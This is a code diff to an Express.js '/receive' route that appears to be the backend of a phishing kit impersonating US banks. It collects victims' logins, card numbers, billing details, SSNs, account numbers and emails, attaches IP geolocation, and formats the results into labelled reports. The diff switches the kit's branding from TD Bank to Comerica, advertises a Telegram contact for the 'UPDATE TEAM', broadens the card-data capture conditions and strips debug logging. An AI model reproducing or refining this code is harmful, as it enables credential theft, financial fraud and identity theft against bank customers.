@@ -171,8 +171,6 @@ app.post('/receive', async (req, res) => {
         const ipAddressInformation = await sendAPIRequest(ipAddress);
         const userAgent = req.headers["user-agent"];
         const systemLang = req.headers["accept-language"];
-
-        console.log("not new");
         
         const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
@@ -197,7 +195,6 @@ app.post('/receive', async (req, res) => {
             message += `👤 ${header} \n\n` +
                 `========================\n\n`;
                 
-                console.log('mexxage');
 
             for (const key of Object.keys(myObject)) {
                 if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
@@ -209,10 +206,9 @@ app.post('/receive', async (req, res) => {
             message += `\n========================\n\n` +
                 (includeFullGeo ? fullGeoInfo : basicGeoInfo) +
                 `========================\n\n` +
-                `✅ UPDATE TEAM | TDBANK\n` +
+                `✅ UPDATE TEAM | COMERICA\n` +
                 `💬 Telegram: https://t.me/updteams\n`;
                 
-                console.log(message);
             res.send({ url: type });
             responseSent = true;
         };
@@ -221,12 +217,12 @@ app.post('/receive', async (req, res) => {
             prepareMessage("LOGIN", "/verify?action=1", true);
         }
 
-        if (!responseSent && myObjects.includes('city')) {
-		    prepareMessage("CARD INFO", redirect_url, false);
-		}
+        if (!responseSent && (myObjects.includes('city') || myObjects.includes('zipcode') || myObjects.includes('cardnumber'))) {
+            prepareMessage("BILLING INFO", redirect_url, false);
+        }
         
 
-        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('accountNumber') || myObjects.includes('email'))) {
+        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('accountnumber') || myObjects.includes('email'))) {
             prepareMessage("ACCOUNT INFO", "/verify?action=3", false);
         }
         
